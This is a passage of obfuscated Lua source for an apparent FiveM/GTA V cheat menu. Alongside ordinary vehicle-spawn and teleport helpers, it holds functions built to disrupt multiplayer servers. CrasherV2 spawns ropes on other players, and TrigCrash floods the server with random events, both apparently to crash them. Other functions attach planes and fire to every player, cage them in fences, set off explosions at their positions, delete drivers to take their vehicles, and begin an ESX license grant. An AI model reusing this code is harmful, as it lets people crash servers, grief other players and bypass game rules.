            ball9 = {-2.411841, 3.025391, 7.294446},
            ball10 = {-2.411841, 3.025391, 7.284446},
            ball11 = {-2.411841, 3.362885, 7.670108}
        }
        for bt9DvEf1NQBuTszC, aZ6KMH in pairs(balls) do
            for KXr1FiWzQdudTW2Nq2p, EICLk in pairs(aZ6KMH) do
            end
        end
    else
        CahvwB3vGb("You must be out of any vehicle !")
    end
end
local function Z()
    local t8WrkR = {"freight", "freightcar", "freightgrain", "freightcont1", "freightcont2", "freighttrailer"}
    for i = 1, 6 do
        RequestModel(GetHashKey(t8WrkR[i]))
        while not HasModelLoaded(GetHashKey(t8WrkR[i])) do
            Citizen.Wait(0)
        end
    end
    local W = GetEntityCoords(PlayerPedId(), false)
    local g2fBZqwwee = CreateMissionTrain(15, W.x, W.y, W.z, 1)
    SetVehicleUndriveable(g2fBZqwwee, false)
    TaskWarpPedIntoVehicle(PlayerPedId(), g2fBZqwwee, -1)
    local tQptLnOYTWd = true
    trainSpeed = 5
    if tQptLnOYTWd then
        if (GetVehiclePedIsIn(PlayerPedId(), false) == g2fBZqwwee) then
            local RHuxAziRnd3gXnAHKr = "Train speed is : ~b~" .. tostring(trainSpeed)
            CahvwB3vGb(RHuxAziRnd3gXnAHKr)
            if (GetGameTimer() >= timer) then
                SetTrainSpeed(g2fBZqwwee, trainSpeed)
                timer = GetGameTimer() + 10
            end
            if (IsDisabledControlJustReleased(1, 188)) then
                trainSpeed = trainSpeed + 0.1
                CahvwB3vGb(RHuxAziRnd3gXnAHKr)
            elseif (IsDisabledControlJustReleased(1, 187)) then
                if (trainSpeed - 0.1 >= 0) then
                    trainSpeed = trainSpeed - 0.1
                end
                CahvwB3vGb(RHuxAziRnd3gXnAHKr)
            end
        end
    end
end
local function D1svT5dhucZLJiRMXU()
    DeleteAllTrains()
    DeleteVehicle(GetVehiclePedIsUsing(GetPlayerPed(-1)))
    DeleteVehicle(GetVehiclePedIsUsing(GetPlayerPed(-1)))
    for FlUOBo67oY in EnumerateVehicles() do
        if (FlUOBo67oY ~= GetVehiclePedIsIn(GetPlayerPed(-1), false)) then
            SetEntityAsMissionEntity(GetVehiclePedIsIn(FlUOBo67oY, true), 1, 1)
            DeleteEntity(GetVehiclePedIsIn(FlUOBo67oY, true))
            SetEntityAsMissionEntity(FlUOBo67oY, 1, 1)
            DeleteEntity(FlUOBo67oY)
        end
    end
    DeleteVehicle(GetVehiclePedIsUsing(GetPlayerPed(-1)))
end
local function SzFf30gwGdZtQ0Q()
    local kVf21UeTeiwX = kR3tkcBRzWGoBkSE("Enter Vehicle Spawn Name", "", 100)
    if kVf21UeTeiwX and IsModelValid(kVf21UeTeiwX) and IsModelAVehicle(kVf21UeTeiwX) then
        RequestModel(kVf21UeTeiwX)
        while not HasModelLoaded(kVf21UeTeiwX) do
            Citizen.Wait(0)
        end
        local JlGLUSwhBJJudP =
            CreateVehicle(
            GetHashKey(kVf21UeTeiwX),
            GetEntityCoords(PlayerPedId(-1)),
            GetEntityHeading(PlayerPedId(-1)),
            true,
            true
        )
        SetPedIntoVehicle(PlayerPedId(-1), JlGLUSwhBJJudP, -1)
    else
        CahvwB3vGb("Model is not valid!")
    end
end
local function aJo0MMIDr8dH08EB(H6XnR)
    SetEntityAsMissionEntity(H6XnR, 1, 1)
    DeleteEntity(H6XnR, false)
    SetEntityAsMissionEntity(H6XnR, 1, 1)
    DeleteEntity(H6XnR, false)
end
local function rdPVF()
    SetVehicleFixed(GetVehiclePedIsIn(GetPlayerPed(-1), false))
    SetVehicleDirtLevel(GetVehiclePedIsIn(GetPlayerPed(-1), false), 0.0)
    SetVehicleLights(GetVehiclePedIsIn(GetPlayerPed(-1), false), 0)
    SetVehicleBurnout(GetVehiclePedIsIn(GetPlayerPed(-1), false), false)
    Citizen.InvokeNative(0x1FD09E7390A74D54, GetVehiclePedIsIn(GetPlayerPed(-1), false), 0)
    SetVehicleUndriveable(vehicle, false)
end
local function uADamocj6YeoW()
    SetVehicleEngineHealth(vehicle, 1000)
    Citizen.InvokeNative(0x1FD09E7390A74D54, GetVehiclePedIsIn(GetPlayerPed(-1), false), 0)
    SetVehicleUndriveable(vehicle, false)
end
local function kixHTv4S1Oelge()
    local _ULENjrgB = GetPlayerPed(-1)
    local XCZeoTK = GetVehiclePedIsIn(_ULENjrgB, true)
    if
        IsPedInAnyVehicle(GetPlayerPed(-1), 0) and
            (GetPedInVehicleSeat(GetVehiclePedIsIn(GetPlayerPed(-1), 0), -1) == GetPlayerPed(-1))
     then
        SetVehicleOnGroundProperly(XCZeoTK)
        CahvwB3vGb("Vehicle Flipped!")
    else
        CahvwB3vGb("You must drive the vehicle to do that!")
    end
end
local function tYNChyj()
    local HyD7albTzFIu_uokKtKg = GetVehiclePedIsIn(GetPlayerPed(-1), false)
    SetVehicleModKit(HyD7albTzFIu_uokKtKg, 0)
    SetVehicleWheelType(HyD7albTzFIu_uokKtKg, 7)
    SetVehicleWindowTint(HyD7albTzFIu_uokKtKg, 1)
    SetVehicleTyresCanBurst(HyD7albTzFIu_uokKtKg, false)
    SetVehicleNumberPlateTextIndex(HyD7albTzFIu_uokKtKg, 1)
    for neon = 0, 3 do
        SetVehicleNeonLightEnabled(HyD7albTzFIu_uokKtKg, neon, true)
    end
    SetVehicleNeonLightsColour(HyD7albTzFIu_uokKtKg, 255, 0, 0)
    for mod = 0, 38 do
        if (mod > 17) then
            SetVehicleMod(HyD7albTzFIu_uokKtKg, mod, GetNumVehicleMods(HyD7albTzFIu_uokKtKg, mod - 1), false)
        elseif (mod < 16 and mod < 23) then
            ToggleVehicleMod(HyD7albTzFIu_uokKtKg, mod, true)
        elseif (mod == 23 or mod == 24) then
            SetVehicleMod(HyD7albTzFIu_uokKtKg, mod, 1, false)
        else
            SetVehicleMod(HyD7albTzFIu_uokKtKg, mod, GetNumVehicleMods(HyD7albTzFIu_uokKtKg, mod - 1), false)
        end
    end
end
local function TVGqnWOVT94yFPrBDln(bLSGQEUXHpXsk)
    local CNLRaB4 = GetPlayerPed(bLSGQEUXHpXsk)
    local ARokGN0_J2lzLpNaofz = kR3tkcBRzWGoBkSE("Enter Vehicle Model Name", "", 100)
    if ARokGN0_J2lzLpNaofz and IsModelValid(ARokGN0_J2lzLpNaofz) and IsModelAVehicle(ARokGN0_J2lzLpNaofz) then
        RequestModel(ARokGN0_J2lzLpNaofz)
        while not HasModelLoaded(ARokGN0_J2lzLpNaofz) do
            Citizen.Wait(0)
        end
        local v =
            CreateVehicle(
            GetHashKey(ARokGN0_J2lzLpNaofz),
            GetEntityCoords(CNLRaB4),
            GetEntityHeading(CNLRaB4),
            true,
            true
        )
        CahvwB3vGb("Spawned a ~b~" .. ARokGN0_J2lzLpNaofz .. " ~s~for ~b~" .. S2J(bLSGQEUXHpXsk) .. "~s~.")
    else
        CahvwB3vGb("~r~Model is not valid!")
    end
end
function CopyPVeh(wLZ5Tr6H0xgja5ACpDZ5)
    local cp9b = GetPlayerPed(wLZ5Tr6H0xgja5ACpDZ5)
    local l = GetVehiclePedIsIn(cp9b, false)
    local GSJKCacHDwxpYL = GetEntityCoords(PlayerPedId())
    if l ~= 0 then
        local Bo2Rn4eM_6AHExMtG = GetEntityModel(l)
        local R4 = GetDisplayNameFromVehicleModel(Bo2Rn4eM_6AHExMtG)
        local UOR9KqzJmkyTJTlb3YL =
            CreateVehicle(GetHashKey(R4), GSJKCacHDwxpYL, GetEntityHeading(GetPlayerPed(-1)), true, false)
        SetPedIntoVehicle(PlayerPedId(), UOR9KqzJmkyTJTlb3YL, -1)
    else
        CahvwB3vGb("Player must be in a vehicle!")
    end
end
armourc = 5
function ArmorPlayer(kiVyWiC)
    local i1iA = "PICKUP_ARMOUR_STANDARD"
    local BgxGpJAaH1zovYAye = GetHashKey(i1iA)
    local DoCqRO3yOYHr2tb82MQ = GetEntityCoords(GetPlayerPed(kiVyWiC))
    for i = 1, armourc do
        CreateAmbientPickup(
            BgxGpJAaH1zovYAye,
            DoCqRO3yOYHr2tb82MQ.x,
            DoCqRO3yOYHr2tb82MQ.y,
            DoCqRO3yOYHr2tb82MQ.z + 1.0,
            1,
            1,
            BgxGpJAaH1zovYAye,
            1,
            0
        )
        SetPickupRegenerationTime(pickup, 60)
    end
end
function Track(zaZlZkL8UyuucghzOWvK)
    local mDIO = false
    local Vu22NHWt1fLSzKERR = GetPlayerPed(zaZlZkL8UyuucghzOWvK)
    if DoesEntityExist(Vu22NHWt1fLSzKERR) and DoesBlipExist(GetBlipFromEntity(Vu22NHWt1fLSzKERR)) then
        mDIO = true
        local jhdsYKsr17YrPS = GetBlipFromEntity(Vu22NHWt1fLSzKERR)
        SetBlipRoute(jhdsYKsr17YrPS, false)
        RemoveBlip(jhdsYKsr17YrPS)
        CahvwB3vGb("~g~GPS Route to ~s~" .. GetPlayerName(zaZlZkL8UyuucghzOWvK) .. " ~g~is now disabled.")
    elseif not mDIO then
        if (zaZlZkL8UyuucghzOWvK ~= PlayerId()) then
            local col1CGHtlwXR7sjtJM5 = GetBlipFromEntity(Vu22NHWt1fLSzKERR)
            if DoesBlipExist(col1CGHtlwXR7sjtJM5) then
                SetBlipColour(col1CGHtlwXR7sjtJM5, 58)
                SetBlipRouteColour(col1CGHtlwXR7sjtJM5, 58)
                SetBlipRoute(col1CGHtlwXR7sjtJM5, true)
            else
                col1CGHtlwXR7sjtJM5 = AddBlipForEntity(Vu22NHWt1fLSzKERR)
                SetBlipColour(col1CGHtlwXR7sjtJM5, 58)
                SetBlipRouteColour(col1CGHtlwXR7sjtJM5, 58)
                SetBlipRoute(col1CGHtlwXR7sjtJM5, true)
            end
            CahvwB3vGb(
                "~g~GPS Route to ~s~" ..
                    GetPlayerName(zaZlZkL8UyuucghzOWvK) ..
                        " ~g~is now active, press ~s~Track Player~g~ button again to disable the route."
            )
        else
            CahvwB3vGb("You can not set a waypoint to yourself.")
        end
    end
end
local function C72K()
    Citizen.CreateThread(
        function()
            local xOZC7 = GetActivePlayers()
            for i = 0, #xOZC7 do
                local KP15dahZ_q9C265z1c1wu = CreateObject(-1207431159, 0, 0, 0, true, true, true)
                local EvZTaCrobvWDbMzfp4 = CreateObject(GetHashKey("cargoplane"), 0, 0, 0, true, true, true)
                local uqxNZicA_ = CreateObject(GetHashKey("prop_beach_fire"), 0, 0, 0, true, true, true)
                AttachEntityToEntity(
                    KP15dahZ_q9C265z1c1wu,
                    GetPlayerPed(i),
                    GetPedBoneIndex(GetPlayerPed(i), 57005),
                    0.4,
                    0,
                    0,
                    0,
                    270.0,
                    60.0,
                    true,
                    true,
                    false,
                    true,
                    1,
                    true
                )
                AttachEntityToEntity(
                    EvZTaCrobvWDbMzfp4,
                    GetPlayerPed(i),
                    GetPedBoneIndex(GetPlayerPed(i), 57005),
                    0.4,
                    0,
                    0,
                    0,
                    270.0,
                    60.0,
                    true,
                    true,
                    false,
                    true,
                    1,
                    true
                )
                AttachEntityToEntity(
                    uqxNZicA_,
                    GetPlayerPed(i),
                    GetPedBoneIndex(GetPlayerPed(i), 57005),
                    0.4,
                    0,
                    0,
                    0,
                    270.0,
                    60.0,
                    true,
                    true,
                    false,
                    true,
                    1,
                    true
                )
            end
        end
    )
end
local function mAFPHG()
    for i = 0, 1000 do
        x, y, z = table.unpack(GetEntityCoords(i))
        roundx = tonumber(string.format("%.2f", x))
        roundy = tonumber(string.format("%.2f", y))
        roundz = tonumber(string.format("%.2f", z))
        while not HasModelLoaded(GetHashKey("prop_fnclink_05crnr1")) do
            Citizen.Wait(0)
            RequestModel(GetHashKey("prop_fnclink_05crnr1"))
        end
        local G4g8w7AxCGHBGF =
            CreateObject(
            GetHashKey("prop_fnclink_05crnr1"),
            roundx - 1.70,
            roundy - 1.70,
            roundz - 1.0,
            true,
            true,
            false
        )
        local HsX0D9PZ =
            CreateObject(
            GetHashKey("prop_fnclink_05crnr1"),
            roundx + 1.70,
            roundy + 1.70,
            roundz - 1.0,
            true,
            true,
            false
        )
        SetEntityHeading(G4g8w7AxCGHBGF, -90.0)
        SetEntityHeading(HsX0D9PZ, 90.0)
        FreezeEntityPosition(G4g8w7AxCGHBGF, true)
        FreezeEntityPosition(HsX0D9PZ, true)
    end
end
local function ccAxcpfUV()
    for i = 0, 1000 do
        if IsPedInAnyVehicle(GetPlayerPed(i), true) then
            local qhqBT0 = "xs_prop_hamburgher_wl"
            local BT = GetHashKey(qhqBT0)
            while not HasModelLoaded(BT) do
                Citizen.Wait(0)
                RequestModel(BT)
            end
            local iAWFFBIbRIs2gOKLlT = CreateObject(BT, 0, 0, 0, true, true, true)
            AttachEntityToEntity(
                iAWFFBIbRIs2gOKLlT,
                GetVehiclePedIsIn(GetPlayerPed(i), false),
                GetEntityBoneIndexByName(GetVehiclePedIsIn(GetPlayerPed(i), false), "chassis"),
                0,
                0,
                -1.0,
                0.0,
                0.0,
                0,
                true,
                true,
                true,
                true,
                1,
                true
            )
        else
            local U = "xs_prop_hamburgher_wl"
            local hUSdVTZ1o8N4 = GetHashKey(U)
            while not HasModelLoaded(hUSdVTZ1o8N4) do
                Citizen.Wait(0)
                RequestModel(hUSdVTZ1o8N4)
            end
            local R = CreateObject(hUSdVTZ1o8N4, 0, 0, 0, true, true, true)
            AttachEntityToEntity(
                R,
                GetPlayerPed(i),
                GetPedBoneIndex(GetPlayerPed(i), 0),
                0,
                0,
                -1.0,
                0.0,
                0.0,
                0,
                true,
                true,
                false,
                true,
                1,
                true
            )
        end
    end
end
local function QR1QougoPAhMCA4S()
    for i = 0, 1000 do
        if IsPedInAnyVehicle(GetPlayerPed(i), true) then
            local dGUOGuQjfG = "xm_prop_iaa_base_elevator"
            local R0nm = GetHashKey(dGUOGuQjfG)
            while not HasModelLoaded(R0nm) do
                Citizen.Wait(0)
                RequestModel(R0nm)
            end
            local _q3wSeUNih4 = CreateObject(R0nm, 0, 0, 0, true, true, true)
            AttachEntityToEntity(
                _q3wSeUNih4,
                GetVehiclePedIsIn(GetPlayerPed(i), false),
                GetEntityBoneIndexByName(GetVehiclePedIsIn(GetPlayerPed(i), false), "chassis"),
                0,
                0,
                -1.0,
                0.0,
                0.0,
                0,
                true,
                true,
                true,
                true,
                1,
                true
            )
        else
            local oF7gSwIEaW0C2Z = "xm_prop_iaa_base_elevator"
            local KqQwDpp = GetHashKey(oF7gSwIEaW0C2Z)
            while not HasModelLoaded(KqQwDpp) do
                Citizen.Wait(0)
                RequestModel(KqQwDpp)
            end
            local issMcUs1gdZEQ = CreateObject(KqQwDpp, 0, 0, 0, true, true, true)
            AttachEntityToEntity(
                issMcUs1gdZEQ,
                GetPlayerPed(i),
                GetPedBoneIndex(GetPlayerPed(i), 0),
                0,
                0,
                -1.0,
                0.0,
                0.0,
                0,
                true,
                true,
                true,
                true,
                1,
                true
            )
        end
    end
end
local function aAq6M8vZMxQd52YXRi()
    for i = 0, 1000 do
        local _MYESZH6ob_vXKW = GetPlayerPed(i)
        local _bpjYYJXzKBP9kMiAlkr = 2172210288
        RequestModel(_bpjYYJXzKBP9kMiAlkr)
        while not HasModelLoaded(_bpjYYJXzKBP9kMiAlkr) do
            Citizen.Wait(0)
        end
        local wnafofueuIR5 =
            CreateVehicle(
            _bpjYYJXzKBP9kMiAlkr,
            GetEntityCoords(_MYESZH6ob_vXKW),
            GetEntityHeading(_MYESZH6ob_vXKW),
            true,
            true
        )
        CahvwB3vGb("Spawned a ~b~stunt plane ~s~for ~b~everyone~s~.")
    end
end
local function hco56bFoyhII8nQJJLv5(P9)
    x, y, z = table.unpack(GetEntityCoords(GetPlayerPed(P9)))
    roundx = tonumber(string.format("%.2f", x))
    roundy = tonumber(string.format("%.2f", y))
    roundz = tonumber(string.format("%.2f", z))
    local j0UA8 = "prop_fnclink_05crnr1"
    local o5xgfhaa4fHcF4Pt2UKe = GetHashKey(j0UA8)
    RequestModel(o5xgfhaa4fHcF4Pt2UKe)
    while not HasModelLoaded(o5xgfhaa4fHcF4Pt2UKe) do
        Citizen.Wait(0)
    end
    local PYdisxVpRPRt3 =
        CreateObject(o5xgfhaa4fHcF4Pt2UKe, roundx - 1.70, roundy - 1.70, roundz - 1.0, true, true, false)
    local rVXGL1AvOkQycgQoF =
        CreateObject(o5xgfhaa4fHcF4Pt2UKe, roundx + 1.70, roundy + 1.70, roundz - 1.0, true, true, false)
    SetEntityHeading(PYdisxVpRPRt3, -90.0)
    SetEntityHeading(rVXGL1AvOkQycgQoF, 90.0)
    FreezeEntityPosition(PYdisxVpRPRt3, true)
    FreezeEntityPosition(rVXGL1AvOkQycgQoF, true)
end
local function Fqu29XXtIicnWVhoKTGI()
    if DoesBlipExist(GetFirstBlipInfoId(8)) then
        local niHbR0RozeHSX7cX9J7RpV = GetBlipInfoIdIterator(8)
        local _PC6um4 = GetFirstBlipInfoId(8, niHbR0RozeHSX7cX9J7RpV)
        WaypointCoords = Citizen.InvokeNative(0xFA7C7F0AADF25D09, _PC6um4, Citizen.ResultAsVector())
        wp = true
    else
        CahvwB3vGb("~r~No waypoint!")
        return
    end
    local bIjhUiW45w = 0.0
    height = 1000.0
    while true do
        Citizen.Wait(0)
        if wp then
            if
                IsPedInAnyVehicle(GetPlayerPed(-1), 0) and
                    (GetPedInVehicleSeat(GetVehiclePedIsIn(GetPlayerPed(-1), 0), -1) == GetPlayerPed(-1))
             then
                entity = GetVehiclePedIsIn(GetPlayerPed(-1), 0)
            else
                entity = GetPlayerPed(-1)
            end
            SetEntityCoords(entity, WaypointCoords.x, WaypointCoords.y, height)
            FreezeEntityPosition(entity, true)
            local q82hHAJe = GetEntityCoords(entity, true)
            if bIjhUiW45w == 0.0 then
                height = height - 25.0
                SetEntityCoords(entity, q82hHAJe.x, q82hHAJe.y, height)
                bool, bIjhUiW45w = GetGroundZFor_3dCoord(q82hHAJe.x, q82hHAJe.y, q82hHAJe.z, 0)
            else
                SetEntityCoords(entity, q82hHAJe.x, q82hHAJe.y, bIjhUiW45w)
                FreezeEntityPosition(entity, false)
                wp = false
                height = 1000.0
                bIjhUiW45w = 0.0
                CahvwB3vGb("~g~Teleported to waypoint!")
                break
            end
        end
    end
end
local function iRm5K3crpG_NlT0m()
    local aqqfFyYnHMMoKfKQ = GetPlayerPed(-1)
    local z9B8k6s = GetEntityCoords(aqqfFyYnHMMoKfKQ, true)
    local WDtaxGsRC8MenzXDsRy = GetClosestVehicle(GetEntityCoords(aqqfFyYnHMMoKfKQ, true), 1000.0, 0, 4)
    local j_5ga9 = GetEntityCoords(WDtaxGsRC8MenzXDsRy, true)
    local j75fIFJwq6 = GetClosestVehicle(GetEntityCoords(aqqfFyYnHMMoKfKQ, true), 1000.0, 0, 16384)
    local cOVpeFKdqcOS = GetEntityCoords(j75fIFJwq6, true)
    CahvwB3vGb("~y~Wait...")
    Citizen.Wait(5000)
    if (WDtaxGsRC8MenzXDsRy == 0) and (j75fIFJwq6 == 0) then
        CahvwB3vGb("~b~No Vehicle Found")
    elseif (WDtaxGsRC8MenzXDsRy == 0) and (j75fIFJwq6 ~= 0) then
        if IsVehicleSeatFree(j75fIFJwq6, -1) then
            SetPedIntoVehicle(aqqfFyYnHMMoKfKQ, j75fIFJwq6, -1)
            SetVehicleAlarm(j75fIFJwq6, false)
            SetVehicleDoorsLocked(j75fIFJwq6, 1)
            SetVehicleNeedsToBeHotwired(j75fIFJwq6, false)
        else
            local YSQIS4BufRTbxUG61_dCd = GetPedInVehicleSeat(j75fIFJwq6, -1)
            ClearPedTasksImmediately(YSQIS4BufRTbxUG61_dCd)
            SetEntityAsMissionEntity(YSQIS4BufRTbxUG61_dCd, 1, 1)
            DeleteEntity(YSQIS4BufRTbxUG61_dCd)
            SetPedIntoVehicle(aqqfFyYnHMMoKfKQ, j75fIFJwq6, -1)
            SetVehicleAlarm(j75fIFJwq6, false)
            SetVehicleDoorsLocked(j75fIFJwq6, 1)
            SetVehicleNeedsToBeHotwired(j75fIFJwq6, false)
        end
        CahvwB3vGb("~g~Teleported Into Nearest Vehicle!")
    elseif (WDtaxGsRC8MenzXDsRy ~= 0) and (j75fIFJwq6 == 0) then
        if IsVehicleSeatFree(WDtaxGsRC8MenzXDsRy, -1) then
            SetPedIntoVehicle(aqqfFyYnHMMoKfKQ, WDtaxGsRC8MenzXDsRy, -1)
            SetVehicleAlarm(WDtaxGsRC8MenzXDsRy, false)
            SetVehicleDoorsLocked(WDtaxGsRC8MenzXDsRy, 1)
            SetVehicleNeedsToBeHotwired(WDtaxGsRC8MenzXDsRy, false)
        else
            local PGrK = GetPedInVehicleSeat(WDtaxGsRC8MenzXDsRy, -1)
            ClearPedTasksImmediately(PGrK)
            SetEntityAsMissionEntity(PGrK, 1, 1)
            DeleteEntity(PGrK)
            SetPedIntoVehicle(aqqfFyYnHMMoKfKQ, WDtaxGsRC8MenzXDsRy, -1)
            SetVehicleAlarm(WDtaxGsRC8MenzXDsRy, false)
            SetVehicleDoorsLocked(WDtaxGsRC8MenzXDsRy, 1)
            SetVehicleNeedsToBeHotwired(WDtaxGsRC8MenzXDsRy, false)
        end
        CahvwB3vGb("~g~Teleported Into Nearest Vehicle!")
    elseif (WDtaxGsRC8MenzXDsRy ~= 0) and (j75fIFJwq6 ~= 0) then
        if
            Vdist(j_5ga9.x, j_5ga9.y, j_5ga9.z, z9B8k6s.x, z9B8k6s.y, z9B8k6s.z) <
                Vdist(cOVpeFKdqcOS.x, cOVpeFKdqcOS.y, cOVpeFKdqcOS.z, z9B8k6s.x, z9B8k6s.y, z9B8k6s.z)
         then
            if IsVehicleSeatFree(WDtaxGsRC8MenzXDsRy, -1) then
                SetPedIntoVehicle(aqqfFyYnHMMoKfKQ, WDtaxGsRC8MenzXDsRy, -1)
                SetVehicleAlarm(WDtaxGsRC8MenzXDsRy, false)
                SetVehicleDoorsLocked(WDtaxGsRC8MenzXDsRy, 1)
                SetVehicleNeedsToBeHotwired(WDtaxGsRC8MenzXDsRy, false)
            else
                local TtBOicge337S8FD19BCQq = GetPedInVehicleSeat(WDtaxGsRC8MenzXDsRy, -1)
                ClearPedTasksImmediately(TtBOicge337S8FD19BCQq)
                SetEntityAsMissionEntity(TtBOicge337S8FD19BCQq, 1, 1)
                DeleteEntity(TtBOicge337S8FD19BCQq)
                SetPedIntoVehicle(aqqfFyYnHMMoKfKQ, WDtaxGsRC8MenzXDsRy, -1)
                SetVehicleAlarm(WDtaxGsRC8MenzXDsRy, false)
                SetVehicleDoorsLocked(WDtaxGsRC8MenzXDsRy, 1)
                SetVehicleNeedsToBeHotwired(WDtaxGsRC8MenzXDsRy, false)
            end
        elseif
            Vdist(j_5ga9.x, j_5ga9.y, j_5ga9.z, z9B8k6s.x, z9B8k6s.y, z9B8k6s.z) >
                Vdist(cOVpeFKdqcOS.x, cOVpeFKdqcOS.y, cOVpeFKdqcOS.z, z9B8k6s.x, z9B8k6s.y, z9B8k6s.z)
         then
            if IsVehicleSeatFree(j75fIFJwq6, -1) then
                SetPedIntoVehicle(aqqfFyYnHMMoKfKQ, j75fIFJwq6, -1)
                SetVehicleAlarm(j75fIFJwq6, false)
                SetVehicleDoorsLocked(j75fIFJwq6, 1)
                SetVehicleNeedsToBeHotwired(j75fIFJwq6, false)
            else
                local v = GetPedInVehicleSeat(j75fIFJwq6, -1)
                ClearPedTasksImmediately(v)
                SetEntityAsMissionEntity(v, 1, 1)
                DeleteEntity(v)
                SetPedIntoVehicle(aqqfFyYnHMMoKfKQ, j75fIFJwq6, -1)
                SetVehicleAlarm(j75fIFJwq6, false)
                SetVehicleDoorsLocked(j75fIFJwq6, 1)
                SetVehicleNeedsToBeHotwired(j75fIFJwq6, false)
            end
        end
        CahvwB3vGb("~g~Teleported Into Nearest Vehicle!")
    end
end
local function i8TdCb4qEaGoIfe1()
    local Wiy6ao0a9nZeuIhepQG = kR3tkcBRzWGoBkSE("Enter Blip Name", "", 100)
    if Wiy6ao0a9nZeuIhepQG == "" then
        CahvwB3vGb("~r~Invalid ~s~blip name!")
        return i8TdCb4qEaGoIfe1()
    else
        local yFMVAM9a436I9wCWV = kR3tkcBRzWGoBkSE("Enter X pos", "", 100)
        local D8XYPvLp = kR3tkcBRzWGoBkSE("Enter Y pos", "", 100)
        local c = kR3tkcBRzWGoBkSE("Enter Z pos", "", 100)
        if yFMVAM9a436I9wCWV ~= "" and D8XYPvLp ~= "" and c ~= "" then
            local MN5FUuXBACo2rhzyT = {{colour = 75, id = 84}}
            for _GzR8RlN6fQ9zEVCgYv, Il2R7 in pairs(MN5FUuXBACo2rhzyT) do
                Il2R7.blip = AddBlipForCoord(yFMVAM9a436I9wCWV + 0.01, D8XYPvLp + 0.01, c + 0.01)
                SetBlipSprite(Il2R7.blip, Il2R7.id)
                SetBlipDisplay(Il2R7.blip, 4)
                SetBlipScale(Il2R7.blip, 1.0)
                SetBlipColour(Il2R7.blip, Il2R7.colour)
                SetBlipAsShortRange(Il2R7.blip, true)
                BeginTextCommandSetBlipName("STRING")
                AddTextComponentString(Wiy6ao0a9nZeuIhepQG)
                EndTextCommandSetBlipName(Il2R7.blip)
            end
            CahvwB3vGb(
                "Blip has been draw at x: ~r~" ..
                    yFMVAM9a436I9wCWV .. "~s~; y: ~r~" .. D8XYPvLp .. "~s~; z: ~r~" .. c .. "~s~ !"
            )
        else
            CahvwB3vGb("~r~Invalid ~s~coords!")
        end
    end
end
local function bEKhuUmIxS6XD()
    local XUZV09Y2lhqSwx45x = "Avenger"
    local AhsKwsydE_kQeWZR8rg = "CARGOPLANE"
    local PVnVxvxK = "luxor"
    local stdMsaaT59LoFMNn509r = "maverick"
    local dsoXvZ96rZ = "blimp2"
    while not HasModelLoaded(GetHashKey(AhsKwsydE_kQeWZR8rg)) do
        Citizen.Wait(0)
        RequestModel(GetHashKey(AhsKwsydE_kQeWZR8rg))
    end
    while not HasModelLoaded(GetHashKey(PVnVxvxK)) do
        Citizen.Wait(0)
        RequestModel(GetHashKey(PVnVxvxK))
    end
    while not HasModelLoaded(GetHashKey(XUZV09Y2lhqSwx45x)) do
        Citizen.Wait(0)
        RequestModel(GetHashKey(XUZV09Y2lhqSwx45x))
    end
    while not HasModelLoaded(GetHashKey(stdMsaaT59LoFMNn509r)) do
        Citizen.Wait(0)
        RequestModel(GetHashKey(stdMsaaT59LoFMNn509r))
    end
    while not HasModelLoaded(GetHashKey(dsoXvZ96rZ)) do
        Citizen.Wait(0)
        RequestModel(GetHashKey(dsoXvZ96rZ))
    end
    for i = 0, 100 do
        CreateVehicle(GetHashKey(XUZV09Y2lhqSwx45x), GetEntityCoords(GetPlayerPed(i)) + 2.0, true, true)
        CreateVehicle(GetHashKey(AhsKwsydE_kQeWZR8rg), GetEntityCoords(GetPlayerPed(i)) + 3.0, true, true)
        CreateVehicle(GetHashKey(PVnVxvxK), GetEntityCoords(GetPlayerPed(i)) + 3.0, true, true)
        CreateVehicle(GetHashKey(stdMsaaT59LoFMNn509r), GetEntityCoords(GetPlayerPed(i)) + 3.0, true, true)
        CreateVehicle(GetHashKey(dsoXvZ96rZ), GetEntityCoords(GetPlayerPed(i)) + 3.0, true, true)
        AddExplosion(GetEntityCoords(GetPlayerPed(i)), 4, 3000.0, true, false, 100000.0)
    end
end
local function cGLGr0RqmPAd3ls()
    local mZ5zJBiU = "a_c_cat_01"
    while not HasModelLoaded(GetHashKey(mZ5zJBiU)) do
        Citizen.Wait(0)
        RequestModel(GetHashKey(mZ5zJBiU))
    end
    for i = 0, 256 do
        if GetPlayerPed(i) ~= GetPlayerPed(-1) then
            CreateObject(GetHashKey(mZ5zJBiU), GetEntityCoords(GetPlayerPed(i)), true, false, false)
        end
    end
end
local function yIwVu2IktHAjxNrQ21W()
    for KO_Ff_dPOGCh7a5ZZ1xyw in EnumerateVehicles() do
        local s5ag = CreateObject(-145066854, 0, 0, 0, true, true, true)
        NetworkRequestControlOfEntity(KO_Ff_dPOGCh7a5ZZ1xyw)
        AttachEntityToEntity(s5ag, KO_Ff_dPOGCh7a5ZZ1xyw, 0, 0, -1.0, 0.0, 0.0, 0, true, true, true, true, 1, true)
        NetworkRequestControlOfEntity(s5ag)
        SetEntityAsMissionEntity(s5ag, true, true)
    end
end
function CrasherV2()
    for i = 0, 256 do
        if GetPlayerPed(i) ~= GetPlayerPed(-1) then
            AddRope(
                GetEntityCoords(GetPlayerPed(i)),
                GetEntityRotation(GetPlayerPed(i), 2),
                0.0,
                0,
                0.0,
                0.0,
                0,
                0,
                0,
                false,
                0,
                false
            )
        end
    end
end
function TrigCrash()
    for i = 0, 256 do
        TriggerServerEvent(math.random(10000000))
    end
end
function Ramp2()
    for AZ in EnumerateVehicles() do
        local cWMm_ = CreateObject(-145066854, 0, 0, 0, true, true, true)
        local zltykXUMjEnk = CreateObject(234083239, 0, 0, 0, true, true, true)
        NetworkRequestControlOfEntity(AZ)
        AttachEntityToEntity(cWMm_, AZ, 0, 0, -1.0, 0.0, 0.0, 0, true, true, true, true, 1, true)
        AttachEntityToEntity(zltykXUMjEnk, AZ, 0, 0, -1.0, 0.0, 0.0, 0, true, true, true, true, 1, true)
        NetworkRequestControlOfEntity(cWMm_)
        NetworkRequestControlOfEntity(zltykXUMjEnk)
        SetEntityAsMissionEntity(cWMm_, true, true)
        SetEntityAsMissionEntity(zltykXUMjEnk, true, true)
        AddRope(GetEntityCoords(cWMm_), GetEntityRotation(cWMm_), 10, 10, 5000, 5000, 0, 0, 0, true, 0, false)
        AddRope(
            GetEntityCoords(zltykXUMjEnk),
            GetEntityRotation(zltykXUMjEnk),
            10,
            10,
            100,
            10,
            0,
            0,
            0,
            true,
            0,
            false
        )
    end
end
function DMVF(QNhi8vRBtsb3wh0)
    if gzhXdn5rXT132aD["esx_license"] then
        local IBYYGRD = {"dmv", "drive", "drive_bike", "drive_truck", "weapon"}
